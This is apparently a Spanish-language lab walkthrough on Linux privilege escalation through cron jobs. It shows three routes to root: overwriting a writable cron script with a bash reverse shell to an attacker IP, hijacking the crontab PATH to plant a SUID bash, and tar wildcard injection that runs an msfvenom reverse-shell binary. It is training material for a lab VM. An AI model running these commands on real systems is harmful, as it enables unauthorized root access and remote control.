# Cron Job

Cron  ejecuta automáticamente comandos o scripts (grupos de comandos) a una hora o fecha específica.

## File Permissions

Las tareas cron son programas o scripts que los usuarios pueden programar para que se ejecuten en momentos o intervalos específicos. Los archivos de tabla cron (crontabs) almacenan la configuración para las tareas cron. La tabla cron del sistema se encuentra en /etc/crontab.&#x20;

```
cat /etc/crontab

# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh


```

Debería haber dos tareas cron programadas para ejecutarse cada minuto. Una ejecuta overwrite.sh, la otra ejecuta /usr/local/bin/compress.sh. Localiza la ruta completa del archivo overwrite.sh:

```
locate overwrite.sh
```

Nota que el archivo tiene permisos de escritura para todos:

```
ls -l /usr/local/bin/overwrite.sh
```

Reemplaza el contenido del archivo overwrite.sh con el siguiente después de cambiar la dirección IP por la de tu máquina Kali.

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

Configura un escucha netcat en tu máquina Kali en el puerto 4444 y espera a que se ejecute la tarea cron.Un shell de root debería conectarse de vuelta a tu escucha netcat.

```
nc -nvlp 4444
```

## PATH Environment Variables

Visualiza el contenido de la tabla cron del sistema:

```
cat /etc/crontab
```

Nota que la variable PATH comienza con /home/user, que es el directorio principal de nuestro usuario.

Crea un archivo llamado overwrite.sh en tu directorio principal con el siguiente contenido:

```bash
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

Asegúrate de que el archivo sea ejecutable:

```
chmod +x /home/user/overwrite.sh
```

Espera a que se ejecute la tarea cron. Ejecuta el comando /tmp/rootbash con -p para obtener un shell que se ejecute con privilegios de root:

```
/tmp/rootbash -p
```

Recuerda eliminar el código modificado, eliminar el ejecutable /tmp/rootbash y salir del shell elevado antes de continuar, ya que crearás este archivo nuevamente más adelante en la tarea.

```
rm /tmp/rootbash
exit
```

## Wildcards

Visualiza el contenido del otro script de tarea cron:

```
cat /usr/local/bin/compress.sh
```

Observa que el comando tar se está ejecutando con un comodín (\*) en tu directorio principal.

Consulta la página GTFOBins para tar. Observa que tar tiene opciones de línea de comandos que te permiten ejecutar otros comandos como parte de una función de punto de control.

Usa msfvenom en tu máquina Kali para generar un binario ELF de shell inversa. Actualiza la dirección IP LHOST en consecuencia:

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
```

Transfiere el archivo shell.elf a /home/user/ en la máquina virtual Debian. Asegúrate de que el archivo sea ejecutable:

```
chmod +x /home/user/shell.elf
```

Crea estos dos archivos en /home/user:

```
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```

Cuando se ejecute el comando tar en la tarea cron, el comodín (\*) se expandirá para incluir estos archivos. Dado que los nombres de archivo son opciones de línea de comandos válidas para tar, tar los reconocerá como tales y los tratará como opciones de línea de comandos en lugar de nombres de archivo.

Configura un oyente de netcat en tu máquina Kali en el puerto 4444 y espera a que se ejecute la tarea cron. Un shell de root debería conectarse de vuelta a tu oyente de netcat.

```
nc -nvlp 4444
```

Recuerda salir del shell de root y eliminar todos los archivos que creaste para evitar que la tarea cron se ejecute nuevamente:

```
rm /home/user/shell.elf
rm /home/user/--checkpoint=1
rm /home/user/--checkpoint-action=exec=shell.elf
```
